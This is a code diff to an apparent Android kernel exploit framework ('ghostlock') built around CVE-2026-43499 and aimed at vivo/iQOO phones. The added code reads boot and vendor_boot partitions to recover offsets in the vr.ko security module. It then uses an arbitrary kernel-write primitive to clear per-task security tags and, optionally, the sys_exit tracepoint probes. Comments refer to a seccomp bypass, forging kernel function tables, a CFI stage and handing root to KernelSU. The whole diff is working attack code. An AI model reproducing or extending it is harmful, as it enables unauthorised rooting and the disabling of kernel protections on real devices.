@@ -11,7 +11,11 @@
 
 #include "session/backend/cve_2026_43499_backend.hpp"
 
+#include "session/backend/cfi_stage.hpp"
+
 #include "attack/ops.hpp"
+#include "bootimg/extract.h"
+#include "bootimg/physmap.h"
 #include "common.h"
 #include "kernel/target.h"
 #include "kernelsnitch/utils.h"
@@ -30,6 +34,10 @@
 
 #include <array>
 #include <cstdint>
+#include <cstdlib>
+#include <span>
+#include <string>
+#include <vector>
 #include <optional>
 #include <string_view>
 #include <utility>
@@ -164,6 +172,87 @@ namespace ghostlock::session::backend {
          * ------------------------------------------------------------------ */
             support::run_state::enter("w2b");
             {
+                /* --------------------------------------------------------------
+                 * 运行时 vr.ko tag 偏移提取（原 1.3 载荷功能，overlay 覆盖时丢失）
+                 *
+                 * 下面的逐任务清零写的是编译期 VR_TAG_B_OFF。vivo/iQOO 设备上
+                 * 权威偏移在 vendor_boot ramdisk 的 vr.ko 里，所以这里把它恢复出来，
+                 * 并在与编译期值不一致时明确告警——而不是静默清错字节对。
+                 * 非致命：失败就退回内置默认值。
+                 * -------------------------------------------------------------- */
+                const char* home_dir = getenv("GHOSTLOCK_HOME");
+                std::string staged_boot = home_dir ? std::string(home_dir) + "/boot.img" : std::string();
+                const char* boot_paths_for_brand_check[] = {
+                    staged_boot.empty() ? nullptr : staged_boot.c_str(),
+                    "/dev/block/by-name/boot_a",
+                    "/dev/block/by-name/boot",
+                    "/boot", "/dev/boot", "/oem/boot", "/vendor/boot", nullptr
+                };
+                std::vector<std::uint8_t> boot_data;
+                for (int32_t bp = 0; boot_paths_for_brand_check[bp]; ++bp) {
+                    auto seg_res = ghostlock::bootimg::load_boot_image(boot_paths_for_brand_check[bp]);
+                    if (seg_res.has_value()) {
+                        boot_data.assign(seg_res.value().begin(), seg_res.value().end());
+                        break;
+                    }
+                }
+
+                /* 属性优先（权威），boot 字节仅作回落。 */
+                std::string brand = ghostlock::bootimg::detect_device_brand_runtime(
+                    std::span<const std::uint8_t>(boot_data));
+
+                if (brand == "vivo" || brand == "iqoo") {
+                    pr_info("VR: detected %s device, loading vendor_boot for dynamic VRKO offsets...\n", brand.c_str());
+                    std::string staged_vb = home_dir
+                            ? std::string(home_dir) + "/vendor_boot.img" : std::string();
+                    const char* vendor_boot_paths[] = {
+                        staged_vb.empty() ? nullptr : staged_vb.c_str(),
+                        "/dev/block/by-name/vendor_boot_a",
+                        "/dev/block/by-name/vendor_boot",
+                        "/vendor/boot", "/dev/vendor_boot", "/oem/vendor_boot", nullptr
+                    };
+                    std::vector<std::uint8_t> vendor_boot_data;
+                    for (int32_t vp = 0; vendor_boot_paths[vp]; ++vp) {
+                        auto vb_res = ghostlock::bootimg::load_boot_image(vendor_boot_paths[vp]);
+                        if (vb_res.has_value()) {
+                            vendor_boot_data.assign(vb_res.value().begin(), vb_res.value().end());
+                            pr_success("VR: loaded vendor_boot from %s\n", vendor_boot_paths[vp]);
+                            break;
+                        }
+                    }
+
+                    if (vendor_boot_data.empty()) {
+                        pr_warning("VR: %s device without vendor_boot.img; "
+                                   "vr.ko tag offsets stay at the built-in defaults\n",
+                                   brand.c_str());
+                        pr_warning("VR: import vendor_boot.img to parse the real "
+                                   "offsets, otherwise the run will likely fail\n");
+                    } else {
+                        const ghostlock::bootimg::VrKoProbeResult vrko_res =
+                            ghostlock::bootimg::probe_vrko_from_vendor_boot(
+                                std::span<const std::uint8_t>(vendor_boot_data));
+                        if (vrko_res.valid) {
+                            pr_success("VR: recovered tag_A=0x%lx tag_B=0x%lx from %s\n",
+                                       static_cast<unsigned long>(vrko_res.tag_a_offset),
+                                       static_cast<unsigned long>(vrko_res.tag_b_offset),
+                                       vrko_res.module_path.c_str());
+                            if (vrko_res.tag_b_offset != static_cast<std::uint64_t>(VR_TAG_B_OFF)) {
+                                pr_warning("VR: module tags at 0x%lx but this build clears 0x%x; "
+                                           "rebuild with -DVR_TAG_B_OFF=0x%lx if the run fails\n",
+                                           static_cast<unsigned long>(vrko_res.tag_b_offset),
+                                           static_cast<unsigned>(VR_TAG_B_OFF),
+                                           static_cast<unsigned long>(vrko_res.tag_b_offset));
+                            }
+                        } else {
+                            pr_warning("VR: vendor_boot present but no vr.ko offsets: %s\n",
+                                       vrko_res.error_msg.c_str());
+                            pr_warning("VR: per-task clear stays on the built-in defaults\n");
+                        }
+                    }
+                } else {
+                    pr_info("VR: device brand=%s, vendor_boot VRKO detection skipped (non-vivo/iQOO)\n", brand.c_str());
+                }
+
                 static int32_t vr_needed = -1;
                 if (vr_needed < 0) {
                     vr_needed = 1; /* /proc/modules unreadable: assume loaded */
@@ -194,14 +283,45 @@ namespace ghostlock::session::backend {
 
                 int32_t vr_ok = 1;
                 if (vr_needed) {
-                    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit) */
+                    /* 1) Clear thread_info.flags word (covers tag A + tracepoint bit).
+                     *
+                     * This one stays a whole-word zero and is the only write here
+                     * that has to be: tag A lives in byte +6 *of this very word*,
+                     * and the syscall-tracepoint bit (TIF_SYSCALL_TRACEPOINT) is
+                     * in it too. Both must be gone before W2's getuid() probe, and
+                     * this runs before the CFI channel exists, so there is no read
+                     * to build a mask from. The collateral (TIF_SIGPENDING,
+                     * TIF_NEED_RESCHED, ...) is bounded: the victim child is a
+                     * tight getuid() loop that takes no signals and is preempted by
+                     * the timer on the syscall-return path regardless. Doing this
+                     * as a read-modify-write needs the resident read to exist
+                     * before W2, which is the separate, re-verified change noted in
+                     * the step-3 design document. */
                     const memory::WriteRequest flags_request = memory::WriteRequest::make(
                         child_task + kernel::TASK_THREAD_INFO_FLAGS_OFF, memory::WriteMode::Zero, 1);
                     vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, flags_request, "VR: flags+tagA");
 
-                    /* 2) Clear tag B (64-bit aligned down). Belt-and-suspenders. */
+                    /* 2) Clear tag B's word (64-bit aligned down).
+                     *
+                     * Tag B sits at +0x2c, inside the 8-byte word this zeroes.
+                     * That word is `struct thread_info`'s preempt_count union
+                     * (`{ u32 count; u32 need_resched; }` on little-endian), so
+                     * the write also drives preempt_count and need_resched to
+                     * zero for this task -- telling the kernel it cannot be
+                     * preempted, for a window in which it still can.
+                     *
+                     * That collateral is real, and it is NOT fixed here. The
+                     * obvious fix (read the word, clear only the tag byte, write
+                     * it back) needs a kernel read in this window, and this runs
+                     * before the CFI channel exists. Switching write mode does not
+                     * help either: the attack primitive's minimum granularity is
+                     * 8 bytes whichever arm carries it, so `WriteMode::Value`
+                     * would store exactly the same word. The fix is to move the
+                     * CFI channel ahead of W2 and use its read -- an attack-order
+                     * change that has to be re-verified end to end, deliberately
+                     * left out of this batch. See the step-3 design document. */
                     if (vr_ok) {
-                        uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
+                        const uintptr_t tagb_align = (child_task + VR_TAG_B_OFF) & ~7ULL;
                         const memory::WriteRequest tagb_request =
                                 memory::WriteRequest::make(tagb_align, memory::WriteMode::Zero, 1);
                         vr_ok &= Cve2026_43499Policy::template attack_write<M>(session, tagb_request, "VR: tagB");
@@ -214,6 +334,84 @@ namespace ghostlock::session::backend {
                     }
                 }
             }
+                /* --------------------------------------------------------------
+                 * 全局开关（原 1.3 载荷功能）：解析 &__tracepoint_sys_exit->funcs
+                 * 优先取 profile；缺失时从内核内嵌 kallsyms/BTF 运行时恢复。
+                 *
+                 * 注意：真正那一笔“把 funcs 指针清零”的内核写默认【关闭】——
+                 * CFI 阶段（neutralize_vr_probes）需要读 sys_exit funcs[] 才能定位
+                 * vr.ko 的模块内探针槽并只改那一个槽；若先把整个指针清零，CFI
+                 * 扫描就会落空。粗粒度写与细粒度中和是同一目标的两代方案，保留
+                 * 细粒度那代，粗粒度留码门住：-DGHOSTLOCK_LEGACY_SYSEXIT_KILLSWITCH=1
+                 * -------------------------------------------------------------- */
+                /* &__tracepoint_sys_exit->funcs = tracepoint image address + the
+                 * funcs slot offset. The chain's profile carries the tracepoint
+                 * image address (sys_exit_tp_off), not a pre-summed funcs pointer. */
+                uintptr_t tp_funcs = 0;
+                {
+                    const uintptr_t tp_image = ghostlock::profile::sys_exit_tp_image();
+                    const size_t funcs_off = ghostlock::profile::tracepoint_funcs_off();
+                    if (tp_image && funcs_off) tp_funcs = tp_image + funcs_off;
+                }
+                if (!tp_funcs) {
+                    pr_info("VR: sys_exit_tp_funcs not in profile; trying bootimg extraction\n");
+                    const char *boot_paths[] = {
+                        "/boot", "/dev/kcore", "/oem/boot", "/vendor/boot", nullptr
+                    };
+                    for (int32_t p = 0; boot_paths[p]; ++p) {
+                        auto seg_res = ghostlock::bootimg::load_boot_image(boot_paths[p]);
+                        if (!seg_res.has_value()) continue;
+                        auto val = ghostlock::bootimg::recover_sys_exit_tp_funcs(
+                            std::span<const std::uint8_t>(seg_res.value()));
+                        if (val.has_value()) {
+                            tp_funcs = *val;
+                            pr_success("VR: recovered sys_exit_tp_funcs=0x%lx from %s\n",
+                                       tp_funcs, boot_paths[p]);
+                            break;
+                        }
+                    }
+                    if (!tp_funcs) {
+                        pr_warning("VR: sys_exit_tp_funcs recovery failed; "
+                                   "falling back to per-task clear only\n");
+                    }
+                } else {
+                    pr_info("VR: sys_exit_tp_funcs=0x%lx (profile)\n", tp_funcs);
+                }
+                if (tp_funcs && (!attack::in_direct_map(tp_funcs) || (tp_funcs & 7u) != 0)) {
+                    pr_warning("VR: sys_exit funcs target 0x%016zx rejected "
+                               "(outside the direct map or misaligned); "
+                               "relying on the per-task clear\n", tp_funcs);
+                    tp_funcs = 0;
+                }
+#if defined(GHOSTLOCK_LEGACY_SYSEXIT_KILLSWITCH) && GHOSTLOCK_LEGACY_SYSEXIT_KILLSWITCH
+                static int32_t vr_global_done = 0;
+                if (!vr_global_done && tp_funcs) {
+                    const memory::WriteRequest tp_request = memory::WriteRequest::make(
+                        tp_funcs, memory::WriteMode::Zero, 1);
+                    const uint32_t tp_attempts =
+                        std::min<uint32_t>(g_exploit_session.profile.w2_attempts(), 2u);
+                    for (uint32_t attempt = 1; attempt <= tp_attempts; attempt++) {
+                        if (attempt > 1) {
+                            pr_warning("VR: sys_exit tp write %u missed; backing off\n", attempt);
+                            usleep(100000);
+                        }
+                        if (Cve2026_43499Policy::template attack_write<M>(
+                                session, tp_request, "VR: sys_exit tp")) {
+                            vr_global_done = 1;
+                            usleep(g_exploit_session.profile.w2_settle_us());
+                            pr_success("VR.ko sys_exit probes disabled globally\n");
+                            break;
+                        }
+                    }
+                    if (!vr_global_done) {
+                        pr_warning("VR: global disable missed; relying on per-task clear\n");
+                    }
+                }
+#else
+                if (tp_funcs) {
+                    pr_info("VR: sys_exit kill-switch write disabled (CFI stage owns neutralisation)\n");
+                }
+#endif
             support::run_state::complete("w2b");
 
             support::run_state::enter("w2a");
@@ -539,6 +737,15 @@ namespace ghostlock::session::backend {
             pr_warning("W3 seccomp bypass failed after %u chain rounds; ksud late-load will likely stay blocked\n",
                        chain_rounds);
         }
+
+        /* The CFI stage -- and with it the vr.ko probe neutralisation -- does NOT
+         * run here any more. It is dispatched by Pipeline::run *after* the
+         * frontend handoff, i.e. once the rooted child has settled KernelSU.
+         * Ordering matters: swapping &ashmem_misc.fops for a forged table and
+         * rewriting the sys_exit tracepoint funcs array happens while the
+         * framework is coming up, and doing that before root has been handed to
+         * KernelSU is what soft-reboots the device. See route/pipeline.hpp. */
+
         /* The frontend handoff step finishes the run. */
         return StageResult::Continue;
     }
